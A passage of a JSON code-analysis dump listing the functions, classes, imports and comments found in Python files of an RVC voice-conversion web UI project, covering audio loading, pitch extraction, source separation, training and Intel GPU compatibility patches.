          "from io import BytesIO",
          "import os",
          "from typing import List, Optional, Tuple",
          "import numpy as np",
          "import torch",
          "from infer.lib import jit",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from infer.modules.ipex import ipex_init",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from librosa.util import normalize, pad_center, tiny",
          "from scipy.signal import get_window",
          "import logging",
          "from time import time as ttime",
          "from librosa.filters import mel",
          "import onnxruntime as ort",
          "import librosa",
          "import soundfile as sf"
        ],
        "comments": [
          "# Fix \"Torch not compiled with CUDA enabled\"",
          "# get window and zero center pad it to filter_length",
          "# window the bases",
          "# self.shortcut:Optional[nn.Module] = None",
          "# print(mel.shape)",
          "# print(x.shape)",
          "# f0 = np.array([10 * (2 ** (cent_pred / 1200)) if cent_pred else 0 for cent_pred in cents_pred])",
          "# torch.cuda.synchronize()",
          "# t0 = ttime()",
          "# print(123123123,mel.device.type)",
          "# torch.cuda.synchronize()",
          "# t1 = ttime()",
          "# torch.cuda.synchronize()",
          "# t2 = ttime()",
          "# print(234234,hidden.device.type)",
          "# torch.cuda.synchronize()",
          "# t3 = ttime()",
          "# print(\"hmvpe:%s\\t%s\\t%s\\t%s\"%(t1-t0,t2-t1,t3-t2,t3-t0))",
          "# t0 = ttime()",
          "# t1 = ttime()",
          "# t2 = ttime()",
          "# t3 = ttime()",
          "# t4 = ttime()",
          "# print(\"decode:%s\\t%s\\t%s\\t%s\" % (t1 - t0, t2 - t1, t3 - t2, t4 - t3))",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)",
          "# f0 = rmvpe.infer_from_audio(audio, thred=thred)"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/audio.py",
        "docstrings": [],
        "function_defs": [
          "def wav2(i, o, format):",
          "def load_audio(file, sr):",
          "def clean_path(path_str):"
        ],
        "class_defs": [],
        "imports": [
          "import platform, os",
          "import ffmpeg",
          "import numpy as np",
          "import av",
          "from io import BytesIO",
          "import traceback",
          "import re"
        ],
        "comments": [
          "# https://github.com/openai/whisper/blob/main/whisper/audio.py#L26",
          "# This launches a subprocess to decode audio while down-mixing and resampling as necessary.",
          "# Requires the ffmpeg CLI and `ffmpeg-python` package to be installed."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/rtrvc.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr, *args):",
          "def __init__(",
          "def forward_dml(ctx, x, scale):",
          "def set_default_model():",
          "def set_jit_model():",
          "def set_synthesizer():",
          "def change_key(self, new_key):",
          "def change_formant(self, new_formant):",
          "def change_index_rate(self, new_index_rate):",
          "def get_f0_post(self, f0):",
          "def get_f0(self, x, f0_up_key, n_cpu, method=\"harvest\"):",
          "def get_f0_crepe(self, x, f0_up_key):",
          "def get_f0_rmvpe(self, x, f0_up_key):",
          "def get_f0_fcpe(self, x, f0_up_key):",
          "def infer("
        ],
        "class_defs": [
          "class RVC:"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "import sys",
          "import traceback",
          "from infer.lib import jit",
          "from infer.lib.jit.get_synthesizer import get_synthesizer",
          "from time import time as ttime",
          "import fairseq",
          "import faiss",
          "import numpy as np",
          "import parselmouth",
          "import pyworld",
          "import scipy.signal as signal",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torchcrepe",
          "from torchaudio.transforms import Resample",
          "from multiprocessing import Manager as M",
          "from configs.config import Config",
          "from infer.lib.rmvpe import RMVPE",
          "from torchfcpe import spawn_bundled_infer_model"
        ],
        "comments": [
          "# config = Config()",
          "# config.device=torch.device(\"cpu\")########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# config.is_half=False########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# global config",
          "# device=\"cpu\"########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# printt(\"using crepe,device:%s\"%self.device)",
          "# device=self.device if self.device.type!=\"privateuseone\" else \"cpu\",###crepe\u4e0d\u7528\u534a\u7cbe\u5ea6\u5168\u90e8\u662f\u5168\u7cbe\u5ea6\u6240\u4ee5\u4e0d\u6101###cpu\u5ef6\u8fdf\u9ad8\u5230\u6ca1\u6cd5\u7528"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/onnx/export.py",
        "docstrings": [],
        "function_defs": [
          "def export_onnx(ModelPath, ExportedPath):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import onnxsim",
          "import onnx",
          "from infer.lib.infer_pack.models_onnx import SynthesizerTrnMsNSFsidM"
        ],
        "comments": [
          "# net_g.construct_spkmixmap(n_speaker) \u591a\u89d2\u8272\u6df7\u5408\u8f68\u9053\u5bfc\u51fa"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/uvr5/vr.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, agg, model_path, device, is_half, tta=False):",
          "def _path_audio_(",
          "def __init__(self, agg, model_path, device, is_half, tta=False):",
          "def _path_audio_("
        ],
        "class_defs": [
          "class AudioPre:",
          "class AudioPreDeEcho:"
        ],
        "imports": [
          "import os",
          "import logging",
          "import librosa",
          "import numpy as np",
          "import soundfile as sf",
          "import torch",
          "from infer.lib.uvr5_pack.lib_v5 import nets_61968KB as Nets",
          "from infer.lib.uvr5_pack.lib_v5 import spec_utils",
          "from infer.lib.uvr5_pack.lib_v5.model_param_init import ModelParameters",
          "from infer.lib.uvr5_pack.lib_v5.nets_new import CascadedNet",
          "from infer.lib.uvr5_pack.utils import inference"
        ],
        "comments": [
          "# Processing Options",
          "# Constants",
          "# print(bands_n)",
          "# Stft of wave source",
          "# pdb.set_trace()",
          "# Postprocess",
          "# Processing Options",
          "# Constants",
          "# print(bands_n)",
          "# Stft of wave source",
          "# pdb.set_trace()",
          "# Postprocess"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/uvr5/modules.py",
        "docstrings": [],
        "function_defs": [
          "def uvr(model_name, inp_root, save_root_vocal, paths, save_root_ins, agg, format0):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import traceback",
          "import logging",
          "import ffmpeg",
          "import torch",
          "from configs.config import Config",
          "from infer.modules.uvr5.mdxnet import MDXNetDereverb",
          "from infer.modules.uvr5.vr import AudioPre, AudioPreDeEcho"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/uvr5/mdxnet.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def stft(self, x):",
          "def istft(self, x, freq_pad=None):",
          "def get_models(device, dim_f, dim_t, n_fft):",
          "def __init__(self, args):",
          "def demix(self, mix):",
          "def demix_base(self, mixes, margin_size):",
          "def prediction(self, m, vocal_root, others_root, format):",
          "def __init__(self, chunks, device):",
          "def _path_audio_(self, input, vocal_root, others_root, format, is_hp3=False):"
        ],
        "class_defs": [
          "class ConvTDFNetTrim:",
          "class Predictor:",
          "class MDXNetDereverb:"
        ],
        "imports": [
          "import os",
          "import logging",
          "import librosa",
          "import numpy as np",
          "import soundfile as sf",
          "import torch",
          "from tqdm import tqdm",
          "import onnxruntime as ort"
        ],
        "comments": [
          "# del self.model"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/vc/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/vc/utils.py",
        "docstrings": [],
        "function_defs": [
          "def get_index_path_from_model(sid):",
          "def load_hubert(config):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "from fairseq import checkpoint_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/vc/pipeline.py",
        "docstrings": [],
        "function_defs": [
          "def cache_harvest_f0(input_audio_path, fs, f0max, f0min, frame_period):",
          "def change_rms(data1, sr1, data2, sr2, rate):  # 1\u662f\u8f93\u5165\u97f3\u9891\uff0c2\u662f\u8f93\u51fa\u97f3\u9891,rate\u662f2\u7684\u5360\u6bd4",
          "def __init__(self, tgt_sr, config):",
          "def get_f0(",
          "def vc(",
          "def pipeline("
        ],
        "class_defs": [
          "class Pipeline(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import logging",
          "from functools import lru_cache",
          "from time import time as ttime",
          "import faiss",
          "import librosa",
          "import numpy as np",
          "import parselmouth",
          "import pyworld",
          "import torch",
          "import torch.nn.functional as F",
          "import torchcrepe",
          "from scipy import signal",
          "from infer.lib.rmvpe import RMVPE"
        ],
        "comments": [
          "# print(data1.max(),data2.max())",
          "# Pick a batch size that doesn't cause memory errors on your gpu",
          "# Compute pitch using first gpu",
          "# with open(\"test.txt\",\"w\")as f:f.write(\"\\n\".join([str(i)for i in f0.tolist()]))",
          "# with open(\"test_opt.txt\",\"w\")as f:f.write(\"\\n\".join([str(i)for i in f0.tolist()]))",
          "# _, I = index.search(npy, 1)",
          "# npy = big_npy[I.squeeze()]",
          "# and file_big_npy != \"\"",
          "# and os.path.exists(file_big_npy) == True",
          "# big_npy = np.load(file_big_npy)"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 3,
        "error_handling": 2,
        "decorators": [
          "@lru_cache"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/vc/modules.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config):",
          "def get_vc(self, sid, *to_return_protect):",
          "def vc_single(",
          "def vc_multi("
        ],
        "class_defs": [
          "class VC:"
        ],
        "imports": [
          "import traceback",
          "import logging",
          "import numpy as np",
          "import soundfile as sf",
          "import torch",
          "from io import BytesIO",
          "from infer.lib.audio import load_audio, wav2",
          "from infer.lib.infer_pack.models import (",
          "from infer.modules.vc.pipeline import Pipeline",
          "from infer.modules.vc.utils import *"
        ],
        "comments": [
          "###\u697c\u4e0b\u4e0d\u8fd9\u4e48\u6298\u817e\u6e05\u7406\u4e0d\u5e72\u51c0",
          "# file_big_npy,"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/preprocess.py",
        "docstrings": [],
        "function_defs": [
          "def println(strr):",
          "def __init__(self, sr, exp_dir, per=3.7):",
          "def norm_write(self, tmp_audio, idx0, idx1):",
          "def pipeline(self, path, idx0):",
          "def pipeline_mp(self, infos):",
          "def pipeline_mp_inp_dir(self, inp_root, n_p):",
          "def preprocess_trainset(inp_root, sr, n_p, exp_dir, per):"
        ],
        "class_defs": [
          "class PreProcess:"
        ],
        "imports": [
          "import multiprocessing",
          "import os",
          "import sys",
          "from scipy import signal",
          "import os",
          "import traceback",
          "import librosa",
          "import numpy as np",
          "from scipy.io import wavfile",
          "from infer.lib.audio import load_audio",
          "from infer.lib.slicer2 import Slicer"
        ],
        "comments": [
          "# zero phased digital filter cause pre-ringing noise...",
          "# audio = signal.filtfilt(self.bh, self.ah, audio)"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/train.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def record(self):",
          "def main():",
          "def run(rank, n_gpus, hps, logger: logging.Logger):",
          "def train_and_evaluate("
        ],
        "class_defs": [
          "class EpochRecorder:"
        ],
        "imports": [
          "import matplotlib",
          "import os",
          "import sys",
          "import logging",
          "import datetime",
          "from infer.lib.train import utils",
          "from random import randint, shuffle",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from infer.modules.ipex import ipex_init",
          "from infer.modules.ipex.gradscaler import gradscaler_init",
          "from torch.xpu.amp import autocast",
          "from torch.cuda.amp import GradScaler, autocast",
          "from torch.cuda.amp import GradScaler, autocast",
          "from time import sleep",
          "from time import time as ttime",
          "import torch.distributed as dist",
          "import torch.multiprocessing as mp",
          "from torch.nn import functional as F",
          "from torch.nn.parallel import DistributedDataParallel as DDP",
          "from torch.utils.data import DataLoader",
          "from torch.utils.tensorboard import SummaryWriter",
          "from infer.lib.infer_pack import commons",
          "from infer.lib.train.data_utils import (",
          "from infer.lib.infer_pack.models import MultiPeriodDiscriminator",
          "from infer.lib.infer_pack.models import SynthesizerTrnMs256NSFsid as RVC_Model_f0",
          "from infer.lib.infer_pack.models import (",
          "from infer.lib.infer_pack.models import (",
          "from infer.lib.train.losses import (",
          "from infer.lib.train.mel_processing import mel_spectrogram_torch, spec_to_mel_torch",
          "from infer.lib.train.process_ckpt import savee"
        ],
        "comments": [
          "# patch to unblock people without gpus. there is probably a better way.",
          "# logger = utils.get_logger(hps.model_dir)",
          "# utils.check_git_hash(hps.model_dir)",
          "# [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1200,1400],  # 16s",
          "# It is possible that dataloader's workers are out of shared memory. Please try to raise your shared memory limit.",
          "# num_workers=8 -> num_workers=4",
          "# Determine device - CUDA, MPS, or CPU",
          "# net_g = DDP(net_g, device_ids=[rank], find_unused_parameters=True)",
          "# net_d = DDP(net_d, device_ids=[rank], find_unused_parameters=True)",
          "# _, _, _, epoch_str = utils.load_checkpoint(utils.latest_checkpoint_path(hps.model_dir, \"G_*.pth\"), net_g, optim_g,load_opt=0)",
          "# epoch_str = 1",
          "# global_step = 0",
          "# traceback.print_exc()",
          "# Prepare data iterator",
          "# Use Cache",
          "# Make new cache",
          "# Unpack",
          "# Load on device (CUDA, MPS, or CPU)",
          "# Cache on list",
          "# Load shuffled cache",
          "# Loader",
          "# Run steps",
          "# Data",
          "## Unpack",
          "## Load on device (CUDA, MPS, or CPU)",
          "# Calculate",
          "# Discriminator",
          "# Generator",
          "# Amor For Tensorboard display",
          "# /Run steps"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/extract_feature_print.py",
        "docstrings": [],
        "function_defs": [
          "def forward_dml(ctx, x, scale):",
          "def printt(strr):",
          "def readwave(wav_path, normalize=False):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import fairseq",
          "import numpy as np",
          "import soundfile as sf",
          "import torch",
          "import torch.nn.functional as F",
          "import torch_directml"
        ],
        "comments": [
          "# wave must be 16k, hop_size=320",
          "# HuBERT model",
          "# if hubert model is exist"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/ipex/attention.py",
        "docstrings": [],
        "function_defs": [
          "def torch_bmm(input, mat2, *, out=None):",
          "def scaled_dot_product_attention(",
          "def attention_init():"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# ARC GPUs can't allocate more than 4GB to a single block, Slice it:",
          "# Find something divisible with the input_tokens",
          "# Find something divisible with the input_tokens",
          "# ARC GPUs can't allocate more than 4GB to a single block, Slice it:",
          "# Find something divisible with the shape_one",
          "# Find something divisible with the batch_size_attention",
          "# ARC GPUs can't allocate more than 4GB to a single block:"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/ipex/hijacks.py",
        "docstrings": [],
        "function_defs": [
          "def __new__(cls, orig_func, sub_func, cond_func):",
          "def __init__(self, orig_func, sub_func, cond_func):",
          "def __call__(self, *args, **kwargs):",
          "def _shutdown_workers(self):",
          "def __new__(",
          "def return_null_context(*args, **kwargs):  # pylint: disable=unused-argument",
          "def check_device(device):",
          "def return_xpu(device):",
          "def ipex_no_cuda(orig_func, *args, **kwargs):",
          "def ipex_autocast(*args, **kwargs):",
          "def torch_cat(tensor, *args, **kwargs):",
          "def interpolate(",
          "def linalg_solve(A, B, *args, **kwargs):  # pylint: disable=invalid-name",
          "def ipex_hijacks():"
        ],
        "class_defs": [
          "class CondFunc:  # pylint: disable=missing-class-docstring",
          "class DummyDataParallel("
        ],
        "imports": [
          "import contextlib",
          "import importlib",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long, unnecessary-lambda, no-else-return",
          "# Functions with dtype errors:",
          "# Diffusers Float64 (ARC GPUs doesn't support double or Float64):",
          "# Broken functions when torch.cuda.is_available is True:",
          "# Functions that make compile mad with CondFunc:"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/ipex/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def ipex_init():  # pylint: disable=too-many-statements"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import contextlib",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from .hijacks import ipex_hijacks",
          "from .attention import attention_init",
          "from .gradscaler import (",
          "from .diffusers import ipex_diffusers"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# Replace cuda with xpu:",
          "# torch.cuda.is_current_stream_capturing = torch.xpu.is_current_stream_capturing",
          "# Memory:",
          "# RNG:",
          "# AMP:",
          "# C",
          "# Fix functions with ipex:"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/ipex/gradscaler.py",
        "docstrings": [],
        "function_defs": [
          "def _unscale_grads_(",
          "def unscale_(self, optimizer):\n\"\"\"\nDivides (\"unscales\") the optimizer's gradient tensors by the scale factor.\n:meth:`unscale_` is optional, serving cases where you need to\n:ref:`modify or inspect gradients<working-with-unscaled-gradients>`\nbetween the backward pass(es) and :meth:`step`.\nIf :meth:`unscale_` is not called explicitly,  gradients will be unscaled  automatically during :meth:`step`.\nSimple example, using :meth:`unscale_` to enable clipping of unscaled gradients::\n...\nscaler.scale(loss).backward()",
          "def update(self, new_scale=None):\n\"\"\"\nUpdates the scale factor.\nIf any optimizer steps were skipped the scale is multiplied by ``backoff_factor``\nto reduce it. If ``growth_interval`` unskipped iterations occurred consecutively,\nthe scale is multiplied by ``growth_factor`` to increase it.\nPassing ``new_scale`` sets the new scale value manually. (``new_scale`` is not\nused directly, it's used to fill GradScaler's internal scale tensor. So if\n``new_scale`` was a tensor, later in-place changes to that tensor will not further\naffect the scale GradScaler uses internally.)",
          "def gradscaler_init():"
        ],
        "class_defs": [],
        "imports": [
          "from collections import defaultdict",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "import intel_extension_for_pytorch._C as core  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# To set up _amp_foreach_non_finite_check_and_unscale_, split grads by device and dtype.",
          "# There could be hundreds of grads, so we'd like to iterate through them just once.",
          "# However, we don't know their devices or dtypes in advance.",
          "# https://stackoverflow.com/questions/5029934/defaultdict-of-defaultdict",
          "# Google says mypy struggles with defaultdicts type annotations.",
          "# sync grad to master weight",
          "# is_coalesced() == False means the sparse grad has values with duplicate indices.",
          "# coalesce() deduplicates indices and adds all values that have the same index.",
          "# For scaled fp16 values, there's a good chance coalescing will cause overflow,",
          "# so we should check the coalesced _values().",
          "# -: is there a way to split by device and dtype without appending in the inner loop?",
          "# FP32 division can be imprecise for certain compile options, so we carry out the reciprocal in FP64.",
          "# Accept a new user-defined scale.",
          "# Consume shared inf/nan data collected from optimizers to update the scale.",
          "# If all found_inf tensors are on the same device as self._scale, this operation is asynchronous.",
          "# To prepare for next iteration, clear the data collected from optimizers this iteration."
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/extract/extract_f0_rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr):",
          "def __init__(self, samplerate=16000, hop_size=160):",
          "def compute_f0(self, path, f0_method):",
          "def coarse_f0(self, f0):",
          "def go(self, paths, f0_method):"
        ],
        "class_defs": [
          "class FeatureInput(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import parselmouth",
          "import logging",
          "import numpy as np",
          "import pyworld",
          "from infer.lib.audio import load_audio",
          "from infer.lib.rmvpe import RMVPE",
          "import torch"
        ],
        "comments": [
          "# p_len = x.shape[0] // self.hop",
          "# use 0 or 1",
          "# exp_dir=r\"E:\\codes\\py39\\dataset\\mi-test\"",
          "# n_p=16",
          "# f = open(\"%s/log_extract_f0.log\"%exp_dir, \"w\")",
          "# ps = []",
          "# for i in range(n_p):",
          "#     p = Process(",
          "#         target=featureInput.go,",
          "#         args=(",
          "#             paths[i::n_p],",
          "#             f0method,",
          "#         ),",
          "#     )",
          "#     ps.append(p)",
          "#     p.start()",
          "# for i in range(n_p):",
          "#     ps[i].join()"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/extract/extract_f0_print.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr):",
          "def __init__(self, samplerate=16000, hop_size=160):",
          "def compute_f0(self, path, f0_method):",
          "def coarse_f0(self, f0):",
          "def go(self, paths, f0_method):"
        ],
        "class_defs": [
          "class FeatureInput(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import parselmouth",
          "import logging",
          "import numpy as np",
          "import pyworld",
          "from infer.lib.audio import load_audio",
          "from multiprocessing import Process",
          "from infer.lib.rmvpe import RMVPE"
        ],
        "comments": [
          "# use 0 or 1",
          "# exp_dir=r\"E:\\codes\\py39\\dataset\\mi-test\"",
          "# n_p=16",
          "# f = open(\"%s/log_extract_f0.log\"%exp_dir, \"w\")"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/modules/train/extract/extract_f0_rmvpe_dml.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr):",
          "def __init__(self, samplerate=16000, hop_size=160):",
          "def compute_f0(self, path, f0_method):",
          "def coarse_f0(self, f0):",
          "def go(self, paths, f0_method):"
        ],
        "class_defs": [
          "class FeatureInput(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import parselmouth",
          "import logging",
          "import numpy as np",
          "import pyworld",
          "from infer.lib.audio import load_audio",
          "import torch_directml",
          "from infer.lib.rmvpe import RMVPE"
        ],
        "comments": [
          "# p_len = x.shape[0] // self.hop",
          "# use 0 or 1",
          "# exp_dir=r\"E:\\codes\\py39\\dataset\\mi-test\"",
          "# n_p=16",
          "# f = open(\"%s/log_extract_f0.log\"%exp_dir, \"w\")",
          "# ps = []",
          "# for i in range(n_p):",
          "#     p = Process(",
          "#         target=featureInput.go,",
          "#         args=(",
          "#             paths[i::n_p],",
          "#             f0method,",
          "#         ),",
          "#     )",
          "#     ps.append(p)",
          "#     p.start()",
          "# for i in range(n_p):",
          "#     ps[i].join()"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/transforms.py",
        "docstrings": [],
        "function_defs": [
          "def piecewise_rational_quadratic_transform(",
          "def searchsorted(bin_locations, inputs, eps=1e-6):",
          "def unconstrained_rational_quadratic_spline(",
          "def rational_quadratic_spline("
        ],
        "class_defs": [],
        "imports": [
          "import numpy as np",
          "import torch",
          "from torch.nn import functional as F"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/models.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward(",
          "def __prepare_scriptable__(self):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def _f02uv(self, f0):",
          "def _f02sine(self, f0, upp):\n\"\"\" f0: (batchsize, length, dim)\nwhere dim indicates fundamental tone and overtones\n\"\"\"",
          "def forward(self, f0: torch.Tensor, upp: int):\n\"\"\"sine_tensor, uv = forward(f0)\ninput F0: tensor(batchsize=1, length, dim=1)\nf0 for unvoiced steps should be 0\noutput sine_tensor: tensor(batchsize=1, length, dim)\noutput uv: tensor(batchsize=1, length, 1)\n\"\"\"",
          "def __init__(",
          "def forward(self, x: torch.Tensor, upp: int = 1):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def infer(",
          "def __init__(",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(self, phone, phone_lengths, y, y_lengths, ds):  # \u8fd9\u91ccds\u662fid\uff0c[bs,1]",
          "def infer(",
          "def __init__(",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, x):",
          "def __init__(self, period, kernel_size=5, stride=3, use_spectral_norm=False):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class TextEncoder(nn.Module):",
          "class ResidualCouplingBlock(nn.Module):",
          "class PosteriorEncoder(nn.Module):",
          "class Generator(torch.nn.Module):",
          "class SineGen(torch.nn.Module):",
          "class SourceModuleHnNSF(torch.nn.Module):",
          "class GeneratorNSF(torch.nn.Module):",
          "class SynthesizerTrnMs256NSFsid(nn.Module):",
          "class SynthesizerTrnMs768NSFsid(SynthesizerTrnMs256NSFsid):",
          "class SynthesizerTrnMs256NSFsid_nono(nn.Module):",
          "class SynthesizerTrnMs768NSFsid_nono(SynthesizerTrnMs256NSFsid_nono):",
          "class MultiPeriodDiscriminator(torch.nn.Module):",
          "class MultiPeriodDiscriminatorV2(torch.nn.Module):",
          "class DiscriminatorS(torch.nn.Module):",
          "class DiscriminatorP(torch.nn.Module):"
        ],
        "imports": [
          "import math",
          "import logging",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, spectral_norm, weight_norm",
          "from infer.lib.infer_pack import attentions, commons, modules",
          "from infer.lib.infer_pack.commons import get_padding, init_weights"
        ],
        "comments": [
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# generate uv signal",
          "# to produce sine waveforms",
          "# to merge source harmonics into a single excitation",
          "# self.ddtype:int = -1",
          "# if self.ddtype ==-1:",
          "#     self.ddtype = self.l_linear.weight.dtype",
          "# print(x.dtype,sine_wavs.dtype,self.l_linear.weight.dtype)",
          "# if self.is_half:",
          "#     sine_wavs = sine_wavs.half()",
          "# sine_merge = self.l_tanh(self.l_linear(sine_wavs.to(x)))",
          "# print(sine_wavs.dtype,self.ddtype)",
          "# if sine_wavs.dtype != self.l_linear.weight.dtype:",
          "# torch.jit.script() does not support direct indexing of torch modules",
          "# That's why I wrote this",
          "# This assertion cannot be ignored! \\",
          "# If ignored, it will cause torch.jit.script() compilation errors",
